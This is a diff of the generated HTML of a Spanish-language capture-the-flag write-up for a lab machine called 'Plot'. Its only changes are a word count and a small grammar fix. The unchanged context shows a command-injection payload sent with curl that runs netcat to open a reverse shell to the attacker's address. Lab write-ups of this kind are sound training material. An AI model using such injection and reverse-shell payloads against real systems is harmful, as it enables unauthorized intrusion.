@@ -52,7 +52,7 @@
         },
         "datePublished": "2023-08-12",
         "description": "Writeup Plot 🟢",
-        "wordCount":  645 ,
+        "wordCount":  644 ,
         "mainEntityOfPage": "True",
         "dateModified": "2023-08-12",
         "image": {
@@ -230,7 +230,7 @@ X-Custom-Header: pl0t.nyx
 </span></span><span style="display:flex;"><span>groups=33(www-data)]
 </span></span><span style="display:flex;"><span>[One of: Select Host First]
 </span></span><span style="display:flex;"><span>[One of: Select Start Date First]
-</span></span></code></pre></div><p>Para obtener la shell correctamente primero la tengo que codificar el comando, para ello me voy a <a href="https://gchq.github.io/CyberChef/">CyberChef</a> y uso la opción <strong>URL Encode</strong>.</p>
+</span></span></code></pre></div><p>Para obtener la shell correctamente primero tengo que codificar el comando, para ello me voy a <a href="https://gchq.github.io/CyberChef/">CyberChef</a> y uso la opción <strong>URL Encode</strong>.</p>
 <p><img src="/../machines/nyx/plot/urlencode.webp" alt="urlencode"></p>
 <p>Una vez tengo el comando codificado lo lanzo con curl.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ curl -s &#34;http://sar.pl0t.nyx/index.php?plot=;nc%20-c%20/bin/bash%20192.168.1.18%204444&#34;
